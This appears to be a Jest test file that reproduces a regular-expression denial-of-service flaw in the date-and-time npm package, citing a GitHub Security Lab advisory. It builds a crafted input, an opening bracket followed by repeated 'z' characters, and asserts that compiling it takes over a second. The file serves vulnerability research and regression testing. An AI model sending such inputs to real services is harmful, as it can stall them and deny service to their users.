//https://securitylab.github.com/advisories/GHSL-2020-349-redos-date-and-time/
test("ReDos in date-and-time", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const date = require("date-and-time");

    let attack_str = "["+ genstr(25, "z") + "";//"[ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"

    let t = measureTime(function () {
        date.compile(attack_str);
    });
    

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});